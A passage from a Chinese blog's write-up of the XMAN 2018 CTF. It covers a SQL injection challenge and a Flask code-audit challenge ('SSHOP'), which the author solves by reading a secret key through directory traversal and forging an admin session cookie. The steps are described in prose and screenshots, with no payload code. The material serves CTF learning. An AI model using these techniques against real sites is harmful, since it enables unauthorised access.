+<p>有个小坑，表名是方括号括着的，要加一对反引号。注意反引号不是乱用的，要跟引号的用法区别开。这题可以说是送分的。。但是我当时就是没有发现这个点，也只能怪自己菜。听说还可以直接sqlmap跑，不明白为什么要出一道sqlmap可以直接跑的题目。<br>好吧。。刚刚知道，这题是有回显的，2分钟解题，过程不写了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/17.png" alt="image"><br><strong>flag:xman{YoVr_4R3_a_Bada5s_Ge7_My_Fl4g}</strong></p>
+<h3 id="0x07-SSHOP"><a href="#0x07-SSHOP" class="headerlink" title="0x07 SSHOP"></a>0x07 SSHOP</h3><p>这是一道代码审计题，也是我比赛的时候心态爆炸的原因。<br>首先，看了一遍代码，很快定位到flag的位置，可以看到，只有is_admin()不为False的时候，页面才会显示出flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/18.png" alt="image">回溯一下，发现只要登录了，session[‘admin’]就会是False<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/19.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/20.png" alt="image">这时候我就开始想，怎样才能构造一个布尔值是True的session[‘admin’]?，全局搜索了一下，发现所有代码里面出现session[‘admin’]的就上面这两个地方了，然后就开始乱想，想过登录绕过，但是其实就算成功了也没用，因为代码逻辑已经给了，绕过成功了也不会对session有任何改变，在这里卡住了很久，非常非常久。我不断地想各种奇奇怪怪的方法，也说明我那时候心态已经不行了。下面给出正确解题过程。首先可以看到，代码里有一个比较明显的目录穿越漏洞<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/21.png" alt="image">其实这个真的非常好发现，但是我当时一心一意想搞session，根本没想到会跟这段代码扯上关系，然后，可以通过这个漏洞去读取到根目录的.secret,这里要提到flask的伪造session方法，也是本题的重点，先给个p牛写的文章<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html完整的解题过程如下：" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html完整的解题过程如下：</a><br>首先通过目录穿越去读取.secret<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/22.png" alt="image">然后，搭好本地环境，把代码里的secret更换成目录穿越读取的.secret<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/23.png" alt="image">然后，把登录后的session[‘admin’]=False改为True<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/24.png" alt="image">这时候可以直接登陆拿cookie了。再把拿到的cookie拿到题目去替换现有的cookie，就能拿到flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/25.png" alt="image"><strong>flag:flag{5b39065adb5c625a2273aee4271b6bde} </strong><br>比赛的时候心态不好，卡在一个地方的时候会变得很烦躁，就会跳来跳去看题，最后一道题都做不出，这个缺点非常需要改正。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/07/HITCON2015-Babyfirst/" rel="next" title="HITCON2015-Babyfirst">
+                <i class="fa fa-chevron-left"></i> HITCON2015-Babyfirst
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XMAN2018个人赛"><span class="nav-number">1.</span> <span class="nav-text">XMAN2018个人赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-FILE"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x00 FILE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-XMAN通行证"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x01 XMAN通行证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-ppap"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x02 ppap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-AUTOKEY"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x03 AUTOKEY</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-MAKEIT"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x04 MAKEIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-SIMPLE-SSRF"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x05 SIMPLE SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-bbsqli"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x06 bbsqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-SSHOP"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x07 SSHOP</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
